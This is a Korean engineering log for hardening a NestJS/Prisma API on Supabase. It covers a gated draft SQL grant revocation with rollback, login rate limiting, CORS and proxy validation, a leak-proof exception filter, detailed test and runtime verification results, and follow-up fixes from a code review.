**SQL 초안** (`prisma/migrations`에 넣지 않았다 — 넣으면 `migrate deploy`가 집어 든다. 실행 여부가 정해지면 그때 마이그레이션으로 만든다):

```sql
-- ⚠️ 초안. 별도 승인 전에는 실행하지 않는다.
BEGIN;
SET LOCAL lock_timeout = '5s';

-- 공개 프론트가 SELECT만 쓰는 두 테이블: 쓰기성 권한만 회수(SELECT는 남긴다)
REVOKE INSERT, UPDATE, DELETE, TRUNCATE, REFERENCES, TRIGGER
  ON TABLE public."Setlist", public."Line Up" FROM anon, authenticated;

-- 프론트가 전혀 쓰지 않는 테이블: 전부 회수 (RLS는 켜져 있으나 정책이 없어 읽기·쓰기는 이미 막혀 있고, TRUNCATE만 남아 있음)
REVOKE ALL ON TABLE public."AdminUser", public."_prisma_migrations" FROM anon, authenticated;

-- 시퀀스: anon/authenticated는 삽입하지 않는다 (삽입은 Prisma = postgres 롤). setlist_id_seq는 "Line Up".id의 identity 시퀀스다
REVOKE ALL ON SEQUENCE public."Setlist_id_seq", public."AdminUser_id_seq", public."setlist_id_seq"
  FROM anon, authenticated;
COMMIT;
```

**영향 평가**

| 대상 | 영향 | 근거 |
| --- | --- | --- |
| 공개 프론트 | **없음** | `src` 전체에 supabase 쓰기 호출 0건, `.from()` 3곳 전부 `.select("*")`+`.order()` |
| Nest(Prisma) | 없음 | `postgres` 롤은 소유자이며 이번 REVOKE의 대상이 아니다 |
| `service_role` | **건드리지 않는다** | Supabase 내부 동작(Storage 등)에 영향을 줄 수 있다(§15 판단 유지). 이번 초안의 대상에서 제외 |
| PostgREST 스키마 캐시 | **확인하지 못했다** | 회수 후 캐시 반응은 실제로 해 보지 않았다 — 실행 절차에 검증 항목으로 넣는다 |
| 미래의 새 테이블 | 초안으로 해결되지 않는다 | `pg_default_acl`이 `postgres`가 만드는 새 테이블·시퀀스에 anon/authenticated 전 권한을 **자동 부여**한다. 지금은 마이그레이션마다 명시적 `REVOKE`(Youtube 두 테이블이 그 선례)로 막고 있다. `ALTER DEFAULT PRIVILEGES`로 기본값 자체를 바꾸면 Supabase가 관리하는 객체까지 영향을 줄 수 있어 **초안에 넣지 않았다** |

**롤백 SQL** (문서 전용. 실행 직전에 `information_schema.role_table_grants`·시퀀스 ACL을 스냅샷으로 떠 두고 그 값으로 복원한다):

```sql
GRANT INSERT, UPDATE, DELETE, TRUNCATE, REFERENCES, TRIGGER
  ON TABLE public."Setlist", public."Line Up" TO anon, authenticated;
GRANT ALL ON TABLE public."AdminUser", public."_prisma_migrations" TO anon, authenticated;
GRANT USAGE, SELECT, UPDATE ON SEQUENCE public."Setlist_id_seq", public."AdminUser_id_seq", public."setlist_id_seq"
  TO anon, authenticated;
```

**실행 시 절차(별도 게이트)**: ① 현재 ACL 스냅샷 → ② `BEGIN…ROLLBACK` 드라이런 → ③ 마이그레이션으로 `migrate deploy` → ④ 직후 검증(권한 조회, `migrate status`, `migrate diff --exit-code`, 린터) → ⑤ anon 키로 SELECT 회귀 + 공개 프론트 페이지(`/`, `/setlist`, `/event-goods`) 확인. 순서 원칙: **코드 되돌리기 → DB 제거**.

### 검증

**단위·통합 테스트: 712 → 852개(40 → 47파일), 전부 통과.** 신규 140개:

- throttler 15(실제 Nest 앱+supertest): 운영 상수 고정, 6번째 로그인 429, 429 본문·`Retry-After`, **로그인 응답에 `X-RateLimit-*` 없음**, 로그인 차단이 다른 라우트에 영향 없음, 일반 라우트 한도 소진이 로그인 카운트에 영향 없음(배타적 적용), 차단 시간 경과 후 회복, 일반 라우트 429 헤더, **`X-Forwarded-For` 위조로 한도를 못 피함**(`trust proxy` 0)과 1단 신뢰 시 클라이언트별 분리, `/health` 제한 제외, `@LoginThrottle()` 표시 위치
- `trust-proxy` 15: 기본 0, 정수 파싱, 음수·소수·문자·IP·지수·16진수·상한 초과 거부
- CORS 35: 파싱(빈 값·중복·와일드카드·`null`·스킴 없음·끝 슬래시·경로·쿼리·기본 포트·대문자·사용자 정보), 실제 앱에서 허용/거부 오리진·preflight·`credentials` 없음·`Retry-After` 노출·**미설정 시 어떤 오리진도 허용 안 함**·Origin 없는 요청 정상·`x-powered-by` 없음
- 헬스 10 / `@Public` 전수 3: `/health` 본문 `{status:"ok"}`와 **DB 미조회**, `/health/db` 401(없음·위조)·200, `@Public()` 위치, 클래스 수준 `@SkipThrottle`, 앱 전체에서 `@Public()` 핸들러가 허용 목록과 정확히 일치
- 예외 필터 42(단위) + 20(통합): 기존 계약(400/401/404/409/413/429, 실제 예외 클래스와 Prisma 매핑 헬퍼), 알 수 없는 오류 8종이 500 고정 문구이고 어느 값도 새지 않음, 파서류 4xx, **로그가 정확히 그 한 줄이며 인자는 그 한 개뿐**, 연결 실패 시 호스트·스택·절대 경로 없음, 쿼리스트링 제거, 로그 주입 방지, 깨진 JSON 4종·413·415·잘못된 퍼센트 인코딩·미지정 라우트 404(쿼리스트링 포함), ValidationPipe·`ParseBigIntPipe`·409, **컨트롤러 범위 필터와의 공존**
- 기존 스펙 3개(multer 파이프라인·throttler·health)가 이제 **전역 필터를 거친다** — multer 한국어 413/400, 401, 429가 필터 위에서도 유지되는 회귀

**변조(mutation)로 검사가 실제로 걸리는지 확인**: (1) 컨트롤러에 `@Public()`을 몰래 붙이면 `public-routes.spec.ts`가 `TeamsController.findAll`을 정확히 지목하며 실패, (2) 어댑터의 오류 변환을 끄면 깨진 JSON 4건과 퍼센트 인코딩 1건이 실패. 둘 다 복원했다. (첫 시도는 `import` 치환이 매칭되지 않아 컴파일 오류로 "no tests"가 나온 **무효한 변조**였고, 원복 후 올바르게 다시 했다.)

**런타임 검증 (포트 3012, 로컬 서명 토큰, 프로덕션 쓰기 0건)** — 서버는 항상 하나만 띄웠고 끝날 때마다 종료를 확인했다.

| 구성 | 확인한 것 | 결과 |
| --- | --- | --- |
| 기동 실패 | `CORS_ALLOWED_ORIGINS`=`*` / 끝 슬래시 / 스킴 없음, `TRUST_PROXY_HOPS`=`abc` / `99` / `-1` | **6건 모두 exit=1**, 포트가 열리지 않음. 오류 메시지가 올바른 정규형을 안내 |
| throttler | 로그인 7회(없는 계정) | `401×5` 후 **6번째부터 429**, `Retry-After: 900`, 로그인 응답에 `X-RateLimit-*` **없음**, 다른 라우트는 정상 + `X-RateLimit-*` 노출 |
| 가드 순서 | 토큰 없는 `GET /teams` 310회 | **401×300, 429×10** → throttler가 JWT Guard보다 먼저 실행됨을 관측 |
| `/health` | 310회 | 전부 200 (제한 제외) |
| XFF 위조 | `X-Forwarded-For` 바꿔 로그인 | 429 (위조가 통하지 않음) |
| ESM 기동 | CJS 패키지 `@nestjs/throttler`가 ESM Nest 12 위에서 | **정상 기동**, 라우트 20개 매핑(커밋 1 시점). Node 24의 `require(esm)`에 기댄 것으로 보이나 그 메커니즘은 확인하지 않았다(동작만 확인) |
| CORS(미설정) | preflight·실제 요청 | 어떤 응답에도 `Access-Control-Allow-Origin` **없음**. preflight는 204이며 `allow-methods`·`allow-headers`·`max-age`는 실리지만 ACAO가 없어 브라우저는 거부한다(`cors` 패키지 동작) |
| CORS(허용 `http://localhost:3010`) | 허용/악성 오리진 | 허용 오리진에만 ACAO, `vary: Origin`, `credentials` 헤더 없음 |
| 헤더 | `x-powered-by` | 없음 |
| `/health` 분리 | 토큰 없음/위조/서명 토큰 | `/health` 200 `{"status":"ok"}`, `/health/db` **401 / 401 / 200**(행 수) |
| 깨진 JSON | 3종 + 인증된 `PATCH` | **전부 400 고정 문구**, `LEAK_MARKER`·`Unexpected`·`position` 없음 |
| 그 밖의 파서 오류 | 200KB / `charset=iso-8859-1` / `%E0%A4%A_PARAM_LEAK` | 413 / 415 / 400, **전부 고정 한국어 + `error` 필드**, 입력 값이 응답에 없음 |
| 미지정 라우트 | `GET /nope?token=QUERY_LEAK`, `POST /nope/deeper` | 404 `요청하신 경로를 찾을 수 없습니다.`, 경로·쿼리·`Cannot` 없음 |
| 기존 계약 회귀 | 401·404(서비스)·404(앨범 커버)·`ParseBigIntPipe` 400·범위 초과 id·ValidationPipe 400(배열)·DTO 금지 필드·없는 계정 401 | **전부 기존과 동일**한 메시지·상태 |
| DB 연결 불가 서버 | `/health/db`·`/auth/login`·`/teams` | 전부 **500 고정 문구**(`error` 포함). `/health`는 200. 로그는 요청당 한 줄, 금지 문자열 10종 **0줄** |
| 정상 서버 로그 | 예외 관련 줄 | 0줄(`HttpException`은 로그를 남기지 않는다) |

**DB 스냅샷 diff = 0** (읽기 전용 확인). 런타임 검증 **전후**로 6개 테이블의 행 수와 내용 해시(`md5(string_agg(row::text ...))`), 5개 시퀀스의 `last_value`를 비교했다.

| 테이블 | 행 수 | 내용 해시 (전 = 후) |
| --- | --- | --- |
| `Line Up` | 15 | `69cd66f5…` |
| `Setlist` | 64 | `11e1741c…` |
| `AdminUser` | 1 | `c89f760c…` |
| `YoutubeSearchAttempt` / `YoutubeRecommendation` | 0 / 0 | 빈 집합 해시 |
| `_prisma_migrations` | 6 | `6f3d62a4…` |

시퀀스 `last_value`(전 = 후): `AdminUser_id_seq` 1 / `Setlist_id_seq` 75 / `YoutubeRecommendation_id_seq` 12 / `YoutubeSearchAttempt_id_seq` 8 / `setlist_id_seq` 24. **이번 단계는 시퀀스를 소모하지 않았다.**

**빌드·린트·타입 검사**: `apps/api` `build`·`lint`·`test`·**스펙 포함 `typecheck` 전부 exit 0**(기존 8건 해소, 이번 브랜치 오류 0). 루트도 실제 작업 트리(환경변수 있음)에서 `npm run lint`·`npm run build` **exit 0**(TypeScript 통과, 정적 페이지 12/12 생성, 소요 약 1분 28초)이다. 이번 브랜치는 루트 앱의 소스를 건드리지 않았고 회귀 확인용이다. 이 빌드는 Supabase를 anon 키로 **SELECT만** 한다. 비밀값 패턴(Supabase secret 키 접두사, JWT 접두사, Google API 키 접두사, 접속 문자열의 자격증명 부분)은 커밋마다 **스테이지된 diff**에서 검사해 매번 0건이었다(문서 커밋에서는 이 문장이 검사 패턴을 리터럴로 적고 있어 오탐이 나서 표현을 바꿨다).

**CI 사전 실측** — 커밋될 파일만(추적 파일 + 무시 대상이 아닌 새 파일 = `.env`·`node_modules`·`dist`·생성 클라이언트 제외)을 깨끗한 디렉터리에 복제해, **관련 환경변수 0개·`.env` 없음**을 확인하고 실행했다.

| 단계 | 결과 |
| --- | --- |
| `npm ci` (apps/api, 루트) | 성공 (515 / 594 패키지, 각 약 26s / 43s) |
| `prisma generate` (환경변수 없음) | **실패** — `PrismaConfigEnvError: Cannot resolve environment variable: DATABASE_URL` |
| `prisma generate` (자리표시 `DATABASE_URL=postgresql://localhost:5432/ci`) | 성공 → 워크플로에서 **이 단계에만** 지정 |
| `lint` / `build` / `typecheck` (환경변수 없음) | 전부 exit 0 |
| `test` (환경변수·`.env` 없음) | **852개 전부 통과** — 테스트가 DB·외부 API를 쓰지 않음을 확인 |
| 루트 `npm run lint` | exit 0 |
| 루트 `next build` (`NEXT_PUBLIC_*` 없음) | **실패** — 컴파일·TypeScript는 통과하나 `Collecting page data`에서 `supabaseUrl is required`(`/setlist`, `/event-goods`) → web 잡은 lint만 |

워크플로 자체는 YAML 파서로 구조를 검증했고(잡 2개, 권한 `contents: read`, 트리거 `pull_request`+`push(develop)`), 금지 패턴(저장소 비밀값·변수 참조, 포크 PR에 권한을 넘기는 이벤트 유형)이 0건이며 액션 4개가 모두 40자 SHA로 고정된 것을 확인했다. **GitHub에서 실제로 돌려 보지는 않았다**(아래 미확인).

### 트러블슈팅 기록

**1) `setHeaders:false`가 `Retry-After`도 끈다**
"로그인은 `X-RateLimit-*` 숨김, `Retry-After` 유지"를 옵션 하나로 될 것으로 봤으나, `guard.js`가 두 헤더를 같은 `if (setHeaders)` 안에서 쓴다. 옵션으로는 불가능해 `login` throttler만 헤더를 끄고 `Retry-After`는 가드에서 직접 내도록 바꿨다. 설계 승인 전에 소스를 읽어 발견했으므로 구현 도중 방향을 바꾼 것은 아니다.

**2) 예외 필터로는 깨진 JSON을 식별할 수 없었다**
처음 설계는 필터에서 `type === 'entity.parse.failed'`를 보는 것이었다. Nest 소스를 확인하니 `mapException`이 필터보다 앞서 `SyntaxError`를 `BadRequestException(원본 메시지)`로 바꿔 `type`을 잃는다. 메시지 문자열로 추측해 잡으면 앱이 던진 비슷한 400과 구분되지 않는다. 그래서 식별이 가능한 지점(어댑터의 `mapException`)에서 바꾸는 쪽으로 설계를 바꿨다.

**3) 테스트 전제가 틀렸던 것 — `charset=utf-16`은 415가 아니다**
415 케이스를 `charset=utf-16`으로 썼다가 400이 나왔다. body-parser의 JSON 파서는 charset이 `utf-`로 **시작하기만 하면** 통과시키고(`charset.slice(0, 4) === 'utf-'`), UTF-8 본문을 UTF-16으로 디코딩하다 파싱 실패(400)가 난다. 코드 결함이 아니라 테스트 전제의 오류라 실제 415가 나는 `iso-8859-1`로 고쳤다.

**4) 첫 변조 시험이 무효했다**
`@Public()` 회귀가 실제로 걸리는지 확인하려고 컨트롤러를 변조했는데, `import` 치환이 매칭되지 않아 컴파일 오류(`no tests`)가 났다. 스펙이 잡은 것이 아니라 파일이 깨진 것이라 결론에 쓰지 않았다. `git checkout`으로 원복 후 import를 맨 앞에 붙여 다시 했고, 그때 `TeamsController.findAll`을 정확히 지목하며 실패했다.

**5) 첫 CI 실측이 환경변수와 무관한 이유로 실패했다**
깨끗한 복제본에서 루트 `next build`가 실패했는데, 원인은 **Windows 경로 길이 초과**(Turbopack, 내 scratchpad 경로가 너무 깊음)였다. 이 결과로 "환경변수 없이 실패"라고 결론 내릴 수 없어 짧은 경로로 옮겨 다시 측정했고, 그때 진짜 원인(`supabaseUrl is required`)을 확인했다.

**6) 검증 도구 쪽 문제들 (API 코드와 무관)**
`python`이 Windows 스토어 스텁이라 편집이 조용히 적용되지 않았고(Node 스크립트로 대체), 긴 heredoc이 파싱에 실패해 스펙 두 개를 만들지 못한 적이 있었다(파일 생성 도구로 대체). `grep -r`을 루트에서 돌려 `node_modules`까지 훑는 바람에 시간 초과가 났다(ripgrep 기반 검색으로 대체). `/health` 테스트는 처음에 Prisma 대역이 비어 500이 났는데(제한이 아니라 구현이 Prisma를 호출), 커밋 단위가 각자 통과하도록 대역을 채웠다.

**7) 조사 보고에서 틀렸던 두 가지 (문서·코드에는 반영되지 않았다)**
(a) "Prisma가 만든 테이블엔 Supabase 기본 ACL이 안 붙음"은 **틀렸다.** `pg_default_acl`은 새 테이블에 anon/authenticated 전 권한을 자동 부여하고(§15에 이미 기록돼 있었다), Youtube 두 테이블은 마이그레이션이 **명시적으로 `REVOKE`**해서 권한이 없는 것이다. 이 차이가 "미래의 새 테이블" 위험(위 권한 회수 영향 평가)에 직결된다. (b) `setlist_id_seq`를 "고아 추정"이라 했으나 `"Line Up".id`의 identity 시퀀스다.

### 이 단계에서 의도적으로 하지 않은 것

- **JWT 방식 변경**, **권한 회수 실행**, **관리자 UI**, **배포·인프라**, **공개 프론트 코드 수정**, **59곡 배치 실행**, **DB 스키마·권한의 실제 변경** — 이번 단계 범위 밖(권한 회수는 SQL 초안·영향·롤백 문서만)
- **계정 단위 로그인 제한** — IP 단위만. IP 분산 공격에는 무력하다(위 기술 판단)
- **`/health/db`의 별도 제한** — 결정에 따라 `@SkipThrottle`이다. 인증된 사용자가 반복 호출하면 DB 조회 3건이 매번 실행된다(관리자 1~3명 규모라 위험이 낮다고 판단)
- **5xx `HttpException`의 로그 추가** — 기존 Nest 기본 동작(로그 없음)을 그대로 뒀다
- **`Retry-After` 외의 응답 헤더 정리**(예: 보안 헤더 `helmet`) — 범위 밖
- **CI에서 루트 `next build`·`tsc`·Dependabot(액션 SHA 갱신)** — web 잡은 lint만. 액션 SHA 고정은 갱신을 사람이 해야 한다는 뜻이다

### 남겨둔 결정 (다음 단계로 이월)

- **권한 회수 실행 여부** — 초안·영향·롤백은 위에 있다. 실행은 별도 게이트(마이그레이션으로 `migrate deploy`, `BEGIN…ROLLBACK` 드라이런 → 적용 → 직후 검증). 실행 전에 **PostgREST 스키마 캐시 반응**을 확인해야 하고, `service_role`은 건드리지 않는다. 새 테이블 기본 ACL 문제는 이 초안으로 해결되지 않는다
- **JWT 방식** — 현행 유지가 이번 결정이다. 7단계 UI를 만든 뒤 실제 사용 패턴(입력 도중 로그인 풀림 빈도)을 보고 재검토한다
- **`TRUST_PROXY_HOPS` 배포 값** — 기본 0. 배포 구성(EC2+nginx면 1)이 정해지면 정한다. **틀리면 위험하다**: 실제보다 크게 잡으면 `X-Forwarded-For` 위조로 요청 제한을 피할 수 있고, 프록시가 있는데 0이면 모든 요청이 프록시 IP 하나로 세어져 **정상 사용자가 한꺼번에 429를 맞는다**(특히 로그인 5회/5분). 배포 직후 `req.ip`가 실제 클라이언트 IP인지 확인한다
- **`CORS_ALLOWED_ORIGINS` 배포 값** — 미설정이면 관리자 프론트가 API를 호출하지 못한다. 배포 시 `admin.` 오리진을 넣는다(로컬 개발은 `http://localhost:3010` 등을 `.env`에)
- **스케일아웃 시 mutex·아웃바운드 상한·throttler를 함께 공유 저장소로 이전** — 셋 다 인메모리라 단일 인스턴스를 전제한다(§15의 mutex·`OutboundRateLimiter`와 같은 문제). 인스턴스가 둘이 되면 로그인 한도가 인스턴스 수만큼 늘어난다
- **CI를 GitHub에서 실제로 실행** — 로컬 시뮬레이션은 Windows·Node 24.12에서 했고 Linux 러너 특유의 문제(대소문자 구분·경로 구분자·`prisma generate`의 엔진 취득)는 확인하지 못했다. 첫 PR에서 실제로 통과하는지 본다. 또한 웹 잡에 `NEXT_PUBLIC_*`를 넣어 `next build`까지 볼지, 액션 SHA 갱신을 어떻게 할지(Dependabot 등)는 별도 결정 **→ 2026-09-21 첫 실행에서 web 잡이 `npm ci`로 실패해 잠금 파일을 고쳤다(위 "교차 리뷰 반영"의 트러블슈팅 5). 수정 후 재실행 결과는 미확인.**
- **로그인 카운트의 범위** — 본문 파서에서 실패하는 요청(깨진 JSON·413·415)은 Guard보다 **앞**에서 끝나 throttler에 세어지지 않는다. 로그인 시도가 될 수 없는 요청이라 위험은 낮지만(요청당 본문 100KB 상한), 반대로 ValidationPipe 400(빈 본문 등)은 **세어진다** — 관리자 UI가 빈 폼을 반복 제출하면 정상 사용자도 5회 제한에 닿을 수 있으므로 UI에서 제출 전 검증을 해야 한다
- **`/health/db`를 배포 플랫폼이 쓸지** — 쓰지 않는 것을 권장한다(위 기술 판단). 플랫폼 헬스체크는 `GET /health`로 잡는다
- **배포 후 확인 사항**: `req.ip` 정상 여부, 429·`Retry-After`가 브라우저에서 읽히는지(`Access-Control-Expose-Headers`), preflight 캐시, 배포 플랫폼의 요청 타임아웃이 배치(최악 25~50초)보다 짧지 않은지, 업로드 본문 상한이 앱 레벨(multer 2MB)보다 작지 않은지
- **§10의 관리자 UI 요건**(추천 리뷰 화면, 재검토 필요 목록, 앨범 커버 후보 선택·URL 직접 입력, 카드 이미지 비율 안내 등)은 그대로 유지한다

### 교차 리뷰 반영 (2026-09-21, 같은 날)

위 작업을 `git diff develop...HEAD`로 교차 리뷰한 결과(High 이상 없음, Medium 3 · Low 13 · Info 4)를 **코드로 고칠 것**과 **기록만 할 것**으로 나눠 반영했다. 코드 수정은 지시한 범위로 한정했고, 나머지는 여기와 §10에만 남긴다.

- **커밋**: M2 `a45674f` / M3 `74cc89a` / L1·L3 `f0107bc` / L8·L10·M1 `5252bba` / L11·L13 `622b3b9` / 문서(이 절)

| ID | 심각도 | 지적 | 처리 |
| --- | --- | --- | --- |
| M2 | Medium | 전역 Guard 순서가 모듈 import 순서에서 우연히 나오고 테스트가 없다 | **수정** — `GlobalGuard`가 코드로 고정 |
| M3 | Medium | 로그에서 메시지·스택을 전부 뺀 탓에 코드 버그(`TypeError` 등)를 진단할 수 없다 | **수정** — 허용 목록 방식 |
| L1 | Low | 어댑터가 모든 `SyntaxError`를 400으로 위장(로그도 없음) | **수정** |
| L3 | Low | 필터 내부 실패 시 안전망 없음 | **수정** |
| L8 | Low | `http:` 오리진이 비루프백에도 허용 | **수정** — 루프백만 |
| L10 | Low | 기동 오류 메시지가 입력 값을 그대로 출력 | **수정** |
| L11·L13 | Low | `push`가 `develop`뿐, `ubuntu-latest` 부동 | **수정** |
| M1 | Medium | `TRUST_PROXY_HOPS` 양방향 설정 함정 | **경고 로그만 추가**(동작 변경 없음) + 배포 체크리스트 기록 |
| L2·L4·L5·L6·L7·L9·L12·I1~I4 | Low/Info | — | **기록만**(아래) |

#### 코드로 반영한 것

**M2 — Guard 순서를 코드로 고정.** `GlobalGuard`(`src/guards/global.guard.ts`)가 `AppThrottlerGuard`와 `JwtAuthGuard`를 주입받아 **요청 제한 → 인증 순으로 직접 호출**한다. `GlobalGuardsModule`이 앱에서 **유일한 `APP_GUARD`**를 등록하고, `ThrottlingModule`·`AuthModule`은 `APP_GUARD` 등록을 제거하고 Guard만 export한다. 기본이 "인증 필요"(fail-closed)이고 `@Public()`으로만 여는 구조는 그대로다. 위 "작업 내용 1)"의 "`ThrottlingModule`을 `AuthModule`보다 먼저 import"는 이것으로 **대체**됐다 — 이제 `AppModule`의 import 순서는 실행 순서에 영향이 없다.

| 검토한 방법 | 판단 |
| --- | --- |
| 모듈 import 순서 유지 + 주석 | 기존 방식. 문서화된 보장이 아니고 다른 모듈이 `AuthModule`을 먼저 import하면 뒤집힌다 |
| 한 모듈 안에서 `APP_GUARD` 두 개를 배열 순서로 등록 | 배열 순서가 Nest의 보장인지 확인하지 못했다(추측) |
| **합성 Guard가 순차 호출** | **채택** — 순서가 우리 코드의 `await` 두 줄이라 Nest의 등록 순서와 무관하다 |

회귀 테스트(`guards/global.guard.spec.ts`, 10개): ① 가짜 Guard로 호출 순서(제한 → 인증), 한도 초과 예외가 나면 인증을 호출하지 않음 ② **실제 모듈 배선**(운영 한도 300 + 실제 `JwtAuthGuard`)에서 **토큰 없는 요청이 300번째까지 401, 이후 429**, 위조 토큰도 카운트, 한도 안에서는 유효 토큰 200·토큰 없음 401·공개 라우트 200, 로그인 6번째 429 ③ 모듈 트리를 스캔해 **`APP_GUARD`가 `GlobalGuard` 하나뿐**임을 검사. **변조 확인**: 호출 순서를 뒤집으면 5건(단위 3 + 통합 2), `AuthModule`에 `APP_GUARD`를 다시 등록하면 1건 실패. 새 전역 Guard가 필요하면 다른 곳에 `APP_GUARD`를 등록하지 말고 `GlobalGuard`에 순서를 정해 넣는다.

**M3 — 예외 로그를 허용 목록 방식으로.** 위 "작업 내용 3)"의 로깅 서술과 기술 판단의 "로그에서 메시지를 통째로 제외"는 이것으로 **갱신**됐다. 기본은 종전대로 `클래스명(code) method path → 상태`다. 아래 조건을 **모두** 만족하는 내장 오류에만 ` | 메시지: … | 위치: …`가 붙는다(`common/error-log.ts`).

| 조건 | 이유 |
| --- | --- |
| 프로토타입이 `TypeError`/`RangeError`/`ReferenceError`/`EvalError`와 **정확히** 같을 것 | 서브클래스(라이브러리가 값을 담은 메시지를 만든다)와 **이름만 위장한 객체**를 배제. 이름이 아니라 프로토타입으로 판별 |
| `code`가 **없을 것** | Node 내부 오류(`ERR_INVALID_ARG_TYPE` 등)는 메시지에 **받은 값**을 싣는다 |
| `SyntaxError`는 **위치만** | `JSON.parse`·`BigInt("…")`의 메시지에 입력 조각이 실린다 |
| 일반 `Error`·Prisma·연결 오류는 **제외** | 앱·라이브러리가 메시지에 값을 넣을 수 있다. 종전과 같은 한 줄 |

메시지는 제어문자·줄 구분자 제거, 절대 경로 마스킹(프로젝트 안의 경로는 상대로), 200자 제한. 위치는 **프로젝트 루트 아래 첫 프레임**만 `함수 (상대경로:줄:열)`로 남기고 node 내부·다른 경로의 프레임은 건너뛴다. 로깅이 접근하면 던지는 객체를 만나도 다시 실패하지 않는다.

> **남는 위험**: V8 내장 메시지는 대부분 식별자·속성명이지만 **드물게 값이 실린다**(예: 숫자 값을 담은 `RangeError`). 허용 목록과 정리로 줄였을 뿐 값을 완전히 배제하지는 못한다. 일반 `Error`를 일부러 제외했기 때문에 앱 코드가 `throw new Error(…)`로 던지는 버그는 여전히 클래스명뿐이다 — 그런 경로가 생기면 전용 예외 클래스를 쓰는 편이 낫다.

변조 확인: 프로토타입 대신 이름으로 판별하면 "이름 위장" 테스트가, `code` 제외 검사를 지우면 "Node 내부 오류" 테스트가 각각 실패. 기존 금지 문자열 10종 검사(접속 호스트·자격증명·절대 경로·스택·`meta`·`driverAdapterError`·쿼리스트링·`Bearer` 등)는 그대로 통과한다.

**L1 — 서버 원인 `SyntaxError`를 400으로 위장하지 않는다.** 부모 `mapException`은 **모든** `SyntaxError`를 `BadRequestException(원본 메시지)`로 바꾸고, `HttpException`이 된 것은 로그도 남지 않는다. 그래서 어댑터는 이제 본문 파서가 붙인 `type`으로 식별되는 오류와 `URIError`만 치환하고, 그 밖의 `SyntaxError`는 **부모를 호출하지 않고 그대로** 돌려준다 → 전역 필터가 500 고정 문구로 응답하고 위치를 로그에 남긴다(`type`이 있는 파서 유래는 종전대로 400 고정 문구). 단위 테스트에 "부모 구현은 실제로 같은 입력을 400+원본 메시지로 바꾼다"는 기준선을 두었고, 실제 Express에서는 `app.use('/syntax-mw', …)`로 서버 쪽 `SyntaxError`를 흘려 500·위치 로그를 확인한다. 변조(부모에 넘김) 시 단위 2건·통합 1건 실패.

**L3 — 필터 내부 안전망.** 응답 결정·작성 전체를 `try/catch`로 감싸고, 실패하면 **미리 만들어 둔 500 본문 문자열**(직렬화 불필요)로 끝낸다. 그마저 실패하면 `destroy()`로 연결을 끊는다(응답 없이 매달리는 것보다 낫다). 원인은 `응답 작성 실패: <실패 클래스> (원본: <원본 클래스>) method path` 한 줄로 남긴다. 로깅 실패는 삼켜서 **정상적으로 결정한 응답을 fallback으로 바꾸지 않는다**. 실제 Express에서 재현되는 경로: 범위 밖 상태코드(`res.status(1000)`이 `RangeError`), 직렬화할 수 없는 값(`BigInt` — 이 코드베이스는 int8을 BigInt로 다룬다), 접근하면 던지는 예외 객체. 변조(안전망 제거) 시 8건 실패.

**L8 — `http:` 오리진은 루프백만.** `localhost`·`127.x.x.x`·`[::1]`만 허용하고 그 밖의 `http:`는 기동 실패. 토큰이 브라우저 JS에 있는 구조라 평문 오리진이 허용되면 네트워크 중간자가 그 오리진의 스크립트를 바꿔 토큰을 빼 갈 수 있다. `https:`는 제한 없음. 자격증명(`사용자:비밀번호@`)이 든 항목도 거부한다. 변조(검사 끔) 시 9건 실패.

**L10 — 기동 오류에 입력 값을 출력하지 않는다.** `CORS_ALLOWED_ORIGINS`·`TRUST_PROXY_HOPS`의 오류는 **항목 위치**(빈 항목 제외, 1부터)와 **이유 범주**만 알린다. 기동 오류는 stderr·journal에 남고, 잘못 붙여 넣은 값이 자격증명일 수 있다. 종전에는 "올바른 정규형"을 되돌려 알려 줬는데 그것도 입력에서 파생된 출력이라 없앴다. 표식(`ECHOMARK`)을 입력에 넣어 메시지에 나오지 않는 것을 13종(CORS)·5종(홉 수)으로 확인했고, 실제 서버 기동에서도 6종이 exit 1이며 표식 노출 0줄이었다.

**M1 — 코드 변경 없음, 경고 로그만.** `TRUST_PROXY_HOPS`가 0이 아니면 기동 때 경고 한 줄(`TRUST_PROXY_HOPS=1: …`, 값과 고정 문장뿐)을 남긴다. 0(기본)이면 없다. `configureHttp` 안에서 남기므로 스펙이 같은 경로를 검증한다.

**L11·L13 — CI.** `push` 트리거에 `main` 추가. `runs-on`을 `ubuntu-latest` → **`ubuntu-24.04`**로 고정(두 잡 모두). 라벨 선택 근거(GitHub `actions/runner-images` 공식 문서, 2026-09-21 확인):

| 확인한 사실 | 출처 |
| --- | --- |
| `ubuntu-latest`는 현재 **24.04**를 가리킨다. `-latest`는 "가장 최신 **안정** 버전"이며 1~2개월에 걸쳐 조용히 다음 OS로 옮겨 간다 | README "Available Images" 표, "Latest Migration Process" |
| 더 새로운 `ubuntu-26.04`는 공식 공지에 **"now available as a public preview"** — GA가 아니다 | `Ubuntu2604-Readme.md` 공지. 이미지 릴리스는 `prerelease=false`지만 그것이 GA를 뜻하지는 않아 **공지 문구를 기준**으로 했다 |
| 22.04는 9월 17일부터 deprecation이 시작돼 다음 4월 17일까지 완전 미지원 | 같은 공지(연도는 표기되지 않음) |

그래서 현재 `ubuntu-latest`와 같은 안정판인 24.04를 고정 라벨로 썼다. 26.04가 GA가 되면 두 잡의 `runs-on`을 함께 올린다. **워크플로 자체는 GitHub에서 아직 실행해 보지 않았다**(YAML 구조 검증과 로컬 시뮬레이션만).

#### 검증 (교차 리뷰 반영분)

**테스트 852 → 972개(+120, 47 → 53파일), 전부 통과.** 신규 파일: `guards/global.guard.spec` 10 / `common/error-log.spec` 32 / `common/all-exceptions.filter.log.spec` 5 / `…filter.safety.spec` 10 / `common/hardened-express.adapter.spec` 16 / `app.setup.spec` 3 (76개). 기존 파일 증가: 통합 계약 스펙 +4(TypeError·SyntaxError·범위 밖 상태코드·BigInt), `cors.spec` +31, `trust-proxy.spec` +9. `build`·`lint`·**스펙 포함 `typecheck` 전부 exit 0**.

런타임(포트 3012, 로컬 서명 토큰, 프로덕션 쓰기 0건, 서버는 하나씩만 띄우고 종료 확인):

| 확인한 것 | 결과 |
| --- | --- |
| **합성 `GlobalGuard` 순서** | 토큰 없는 `GET /teams` 310회 → **401×300, 429×10**(이전 배선과 동일). 로그인 7회 → `401×5` 후 429(`Retry-After: 900`), 로그인 응답에 `X-RateLimit-*` 없음, `/health` 310회 전부 200, XFF 위조 무효 |
| 예외 응답 회귀 | 19개 항목(깨진 JSON 4종·413·415·퍼센트 인코딩·404 2종·401·404(서비스)·404(앨범 커버)·`ParseBigIntPipe` 2종·ValidationPipe 2종·없는 계정 401·`/health`·로그인 429) **전부 기존과 동일** |
